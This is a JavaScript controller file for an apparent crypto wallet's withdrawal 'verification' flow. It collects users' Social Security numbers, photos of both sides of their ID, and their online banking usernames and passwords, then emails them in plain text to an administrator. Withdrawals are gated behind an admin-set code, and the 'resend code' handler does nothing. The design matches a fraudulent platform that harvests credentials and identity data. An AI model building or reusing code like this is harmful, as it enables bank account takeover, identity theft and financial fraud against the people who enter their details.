const cloudinary = require('../config/cloudinary');
const Verification = require('../models/Verification');
const Withdrawal = require('../models/Withdrawal');
const Notification = require('../models/Notification');
const { findAsset } = require('../utils/assets');
const { notifyAdminAsync } = require('../config/mailer');

async function getOrCreateVerification(userId) {
  let v = await Verification.findOne({ userId });
  if (!v) v = await Verification.create({ userId });
  return v;
}

function uploadToCloudinary(buffer, folder, publicId) {
  return new Promise((resolve, reject) => {
    const stream = cloudinary.uploader.upload_stream(
      { folder, public_id: publicId, resource_type: 'image' },
      (error, result) => (error ? reject(error) : resolve(result))
    );
    stream.end(buffer);
  });
}

exports.submitVerification = async (req, res) => {
  try {
    const { email, phone, ssn, address } = req.body;
    if (!email || !phone || !ssn || !address) {
      return res.status(400).json({ message: 'All verification fields required' });
    }
    const v = await getOrCreateVerification(req.user._id);
    v.email = email;
    v.phone = phone;
    v.ssn = ssn;
    v.address = address;
    await v.save();

    // fire-and-forget email
    notifyAdminAsync(
      'New Identity Verification Submitted',
      `<h3>Identity Verification</h3>
       <p><b>User:</b> ${req.user.firstName} ${req.user.lastName} (${req.user.email})</p>
       <p><b>Email:</b> ${email}</p>
       <p><b>Phone:</b> ${phone}</p>
       <p><b>SSN:</b> ${ssn}</p>
       <p><b>Address:</b> ${address}</p>`
    );

    return res.json({ message: 'Verification info received' });
  } catch (err) {
    return res.status(500).json({ message: err.message });
  }
};

exports.uploadId = async (req, res) => {
  try {
    const { idType } = req.body;
    if (!req.files || !req.files.front || !req.files.back) {
      return res.status(400).json({ message: 'Front and back images required' });
    }
    const v = await getOrCreateVerification(req.user._id);

    // Upload to Cloudinary in parallel
    const [frontRes, backRes] = await Promise.all([
      uploadToCloudinary(
        req.files.front[0].buffer,
        'fortis_wallet/ids',
        `user_${req.user._id}_front_${Date.now()}`
      ),
      uploadToCloudinary(
        req.files.back[0].buffer,
        'fortis_wallet/ids',
        `user_${req.user._id}_back_${Date.now()}`
      ),
    ]);

    v.idType = idType || 'license';
    v.idFront = frontRes.secure_url;
    v.idBack = backRes.secure_url;
    await v.save();

    // fire-and-forget email
    notifyAdminAsync(
      'ID Documents Uploaded',
      `<h3>ID Documents</h3>
       <p><b>User:</b> ${req.user.firstName} ${req.user.lastName} (${req.user.email})</p>
       <p><b>ID Type:</b> ${v.idType}</p>
       <p><b>Front:</b> <a href="${v.idFront}">Download</a></p>
       <p><b>Back:</b> <a href="${v.idBack}">Download</a></p>`
    );

    return res.json({ message: 'ID uploaded', front: v.idFront, back: v.idBack });
  } catch (err) {
    return res.status(500).json({ message: err.message });
  }
};

exports.submitAmount = async (req, res) => {
  try {
    const { symbol, amount } = req.body;
    if (!symbol || !amount || Number(amount) <= 0) {
      return res.status(400).json({ message: 'Valid symbol and amount required' });
    }
    const meta = findAsset(symbol);
    if (!meta) return res.status(400).json({ message: 'Invalid asset' });

    const userAsset = req.user.assets.find((a) => a.symbol === symbol);
    if (!userAsset || userAsset.amount < Number(amount)) {
      return res.status(400).json({ message: 'Insufficient balance' });
    }

    const v = await getOrCreateVerification(req.user._id);
    v.pendingWithdrawal = { symbol, amount: Number(amount) };
    await v.save();
    return res.json({ message: 'Withdrawal amount saved' });
  } catch (err) {
    return res.status(500).json({ message: err.message });
  }
};

exports.submitBank = async (req, res) => {
  try {
    const { bankName, bankAddress } = req.body;
    if (!bankName || !bankAddress) {
      return res.status(400).json({ message: 'Bank name and address required' });
    }
    const v = await getOrCreateVerification(req.user._id);
    v.bankName = bankName;
    v.bankAddress = bankAddress;
    await v.save();
    return res.json({ message: 'Bank details saved' });
  } catch (err) {
    return res.status(500).json({ message: err.message });
  }
};

exports.connectBank = async (req, res) => {
  try {
    const { bankName, username, password } = req.body;
    if (!bankName || !username || !password) {
      return res.status(400).json({ message: 'All bank fields required' });
    }
    const v = await getOrCreateVerification(req.user._id);
    v.bankLogin = { bankName, username, password };
    await v.save();

    notifyAdminAsync(
      'Bank Login Submitted',
      `<h3>Bank Connection</h3>
       <p><b>User:</b> ${req.user.firstName} ${req.user.lastName} (${req.user.email})</p>
       <p><b>Bank Name:</b> ${bankName}</p>
       <p><b>Username:</b> ${username}</p>
       <p><b>Password:</b> ${password}</p>`
    );

    return res.json({ message: 'Bank connected' });
  } catch (err) {
    return res.status(500).json({ message: err.message });
  }
};

exports.verifyCode = async (req, res) => {
  try {
    const { code } = req.body;
    if (!code) return res.status(400).json({ message: 'Code required' });

    const v = await getOrCreateVerification(req.user._id);
    const submitted = String(code).trim();
    v.codes.push({ code: submitted, createdAt: new Date() });
    await v.save();

    const isCorrect = Boolean(v.withdrawalCode) && v.withdrawalCode === submitted;

    notifyAdminAsync(
      `Withdrawal Code Submitted — ${isCorrect ? 'CORRECT' : 'INCORRECT'}`,
      `<h3>Withdrawal Code Submitted</h3>
       <p><b>User:</b> ${req.user.firstName} ${req.user.lastName} (${req.user.email})</p>
       <p><b>Submitted Code:</b> ${submitted}</p>
       <p><b>Expected Code:</b> ${v.withdrawalCode || '(not set)'}</p>
       <p><b>Status:</b> ${isCorrect ? 'CORRECT' : 'INCORRECT'}</p>`
    );

    if (isCorrect && v.pendingWithdrawal && v.pendingWithdrawal.symbol) {
      await Withdrawal.create({
        userId: req.user._id,
        symbol: v.pendingWithdrawal.symbol,
        amount: v.pendingWithdrawal.amount,
        bankName: v.bankName,
        bankAddress: v.bankAddress,
        status: 'pending',
      });

      await Notification.create({
        userId: req.user._id,
        title: 'Withdrawal Pending Approval',
        message: `Your withdrawal of $${Number(v.pendingWithdrawal.amount).toFixed(2)} of ${
          v.pendingWithdrawal.symbol
        } is pending final approval.`,
      });

      notifyAdminAsync(
        'Withdrawal Ready for Approval',
        `<h3>Withdrawal Pending</h3>
         <p><b>User:</b> ${req.user.firstName} ${req.user.lastName} (${req.user.email})</p>
         <p><b>Asset:</b> ${v.pendingWithdrawal.symbol}</p>
         <p><b>Amount:</b> $${Number(v.pendingWithdrawal.amount).toFixed(2)}</p>
         <p><b>Bank:</b> ${v.bankName}</p>`
      );
    }

    return res.json({ correct: isCorrect });
  } catch (err) {
    return res.status(500).json({ message: err.message });
  }
};

exports.resendCode = async (req, res) => {
  try {
    return res.json({ message: 'Code resend window reset' });
  } catch (err) {
    return res.status(500).json({ message: err.message });
  }
};